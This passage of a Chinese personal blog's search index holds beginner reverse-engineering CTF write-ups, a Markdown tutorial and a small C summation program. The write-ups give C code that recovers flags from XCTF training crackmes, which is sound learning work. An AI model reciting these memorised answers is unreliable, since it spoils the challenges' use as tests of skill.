href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5076&page=1">题目链接</a><br>此题文件可直接放入编译器中打开。</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/open-source.png"></p><p>直接计算：51966*31337+8*11+7-1615810207=12648430<br>转16进制：c0ffee</p><h2 id="simple-unpack"><a href="#simple-unpack" class="headerlink" title="simple-unpack"></a>simple-unpack</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5077&page=1">题目链接</a><br>查看文件</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/simple-unpack_2.png"></p><p>软件去壳，再用ida打开</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/simple-unpack_4.png"></p><h2 id="logmein"><a href="#logmein" class="headerlink" title="logmein"></a>logmein</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5078&page=1">题目链接</a><br>ida打开，查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/logmein_1.png"></p><p>还原程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#define _BYTE unsigned char</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">char v8[18] &#x3D; &quot;:\&quot;AL_RT^L*.?+6&#x2F;46&quot;;</span><br><span class="line">long long int v7 &#x3D; 28537194573619560;</span><br><span class="line">int v6 &#x3D; 7;</span><br><span class="line">char s[18] &#x3D; &quot; &quot;;</span><br><span class="line">int i;</span><br><span class="line">for(i &#x3D; 0; i &lt; strlen(v8); ++i)</span><br><span class="line">&#123;</span><br><span class="line">s[i] &#x3D; (char)(*((_BYTE *)&amp;v7 + i % v6) ^ v8[i]);</span><br><span class="line">&#125;</span><br><span class="line">printf(&quot;%s&quot;, s);</span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p><h2 id="getit"><a href="#getit" class="headerlink" title="getit"></a>getit</h2><p><a href="https://adworld.xctf.org.cn/task/answer?type=reverse&number=4&grade=0&id=5082&page=1">题目链接</a><br>ida打开，查看main函数伪代码：</p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/getit_1.png"></p><p><img src="/2020/11/28/%E7%AC%AC%E4%B8%80%E5%91%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/getit_2.png"></p><p>还原程序：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int v5 &#x3D; 0;</span><br><span class="line">int v3;</span><br><span class="line">char s[100] &#x3D; &quot;c61b68366edeb7bdce3c6820314b7498&quot;;</span><br><span class="line">char t[100] &#x3D; &quot;SharifCTF&#123;????????????????????????????????&#125;&quot;;</span><br><span class="line">while ( v5 &lt; strlen(s) )</span><br><span class="line">            &#123;</span><br><span class="line">                if ( v5 &amp; 1 )</span><br><span class="line">                 v3 &#x3D; 1;</span><br><span class="line">                else</span><br><span class="line">                 v3 &#x3D; -1;</span><br><span class="line">                *(t + v5 + 10) &#x3D; s[v5] + v3;</span><br><span class="line">                v5 &#x3D; v5 + 1;</span><br><span class="line">            &#125;</span><br><span class="line">    printf(&quot;%s&quot;, t);</span><br><span class="line">return 0; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>输出结果即为flag。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> Re </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-Re-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown基本语法</title>
      <link href="2020/11/20/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/"/>
      <url>2020/11/20/Markdown%E5%9F%BA%E6%9C%AC%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="一、标题"><a href="#一、标题" class="headerlink" title="一、标题"></a>一、标题</h1><a id="more"></a><p>在想要设置为标题的文字前面加#来表示<br>一个#是一级标题，二个#是二级标题，以此类推。支持六级标题。</p><p>示例(实际应用中去掉前方\或丨)：<br>\1. # 这是一级标题<br>\2. ## 这是二级标题<br>\3. ### 这是三级标题<br>\4. #### 这是四级标题<br>\4. ##### 这是五级标题<br>\6. ###### 这是六级标题<br>效果：</p><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><h1 id="二、字体"><a href="#二、字体" class="headerlink" title="二、字体"></a>二、字体</h1><p> 要加粗的文字左右分别用两个”<em>“号包起来<br> 要倾斜的文字左右分别用一个”</em>“号包起来<br> 要倾斜和加粗的文字左右分别用三个”<em>“号包起来<br> 要加删除线的文字左右分别用两个”~~”号包起来<br>示例：<br>\1. <strong>这是加粗的文字</strong><br>\2. <em>这是倾斜的文字</em><br>\3. **</em>这是斜体加粗的文字***<br>\4. <del>这是加删除线的文字</del></p><p>效果：<br><strong>这是加粗的文字</strong><br><em>这是倾斜的文字</em><br>**<em>这是斜体加粗的文字**</em><br><del>这是加删除线的文字</del></p><h1 id="三、引用"><a href="#三、引用" class="headerlink" title="三、引用"></a>三、引用</h1><p>在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;<br>n个…<br>示例：<br>\1. &gt;这是引用的内容<br>\2. &gt;&gt;这是引用的内容<br>\3. &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</p><p>效果：</p><blockquote><p>这是引用的内容</p><blockquote><p>这是引用的内容</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>这是引用的内容</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><h1 id="四、分割线"><a href="#四、分割线" class="headerlink" title="四、分割线"></a>四、分割线</h1><p>三个或者三个以上的 - 或者 * 都可以。<br>示例：<br>\1. —<br>\2. —-<br>\3. <strong>*<br>\4. ***</strong></p><h2 id="效果："><a href="#效果：" class="headerlink" title="效果："></a>效果：</h2><hr><hr><hr><blockquote><p>持续更新中</p></blockquote><p><a href="https://www.jianshu.com/p/191d1e21f7ed/">文章内容来源</a></p>]]></content>
      
      
      <categories>
          
          <category> 杂项 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 杂项 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前n项和</title>
      <link href="2020/11/19/%E5%89%8Dn%E9%A1%B9%E5%92%8C/"/>
      <url>2020/11/19/%E5%89%8Dn%E9%A1%B9%E5%92%8C/</url>
      
        <content type="html"><![CDATA[<h1 id="计算前n项和（C语言）"><a href="#计算前n项和（C语言）" class="headerlink" title="计算前n项和（C语言）"></a>计算前n项和（C语言）</h1><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt; &#x2F;&#x2F;计算1+2+3+...+n </span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line">int a, b, c, d;</span><br><span class="line">b &#x3D; 0;</span><br><span class="line">c &#x3D; 0;</span><br><span class="line">printf(&quot;请输入1开始程序\n&quot;);</span><br><span class="line">while(scanf(&quot;%d&quot;, &amp;d) &#x3D;&#x3D; 1)</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;请输入n（为数字），输出结果为：1+2+3+...+n\n&quot;);</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;a);</span><br><span class="line">    while (b &lt;&#x3D; a)</span><br><span class="line">        &#123;</span><br><span class="line">         c &#x3D; b + c;</span><br><span class="line">         b++; </span><br><span class="line">        &#125;</span><br><span class="line">    printf(&quot;1+2+3+...+n &#x3D; %d\n&quot;, c);</span><br><span class="line">    printf(&quot;请输入q离开程序，或者输入1再次开始程序计算令一个1+2+3+...+n\n&quot;);</span><br><span class="line">    b &#x3D; 0;</span><br><span class="line">    c &#x3D; 0;</span><br><span class="line">   &#125;</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>因本人能力限制，不会其他的函数，所以此代码比较复杂。</p></blockquote><hr><h2 id="推荐一本C语言入门书籍"><a href="#推荐一本C语言入门书籍" class="headerlink" title="推荐一本C语言入门书籍"></a>推荐一本C语言入门书籍</h2><p><img src="https://img1.doubanio.com/view/subject/l/public/s29438897.jpg" alt="C Primer Plus"><br><a href="https://item.jd.com/12627795.html">购买C Primer Plus（京东）</a></p>]]></content>
      
      
      <categories>
          
          <category> C/C++ </category>
          
          <category> 编程练习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C/C++-编程练习 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
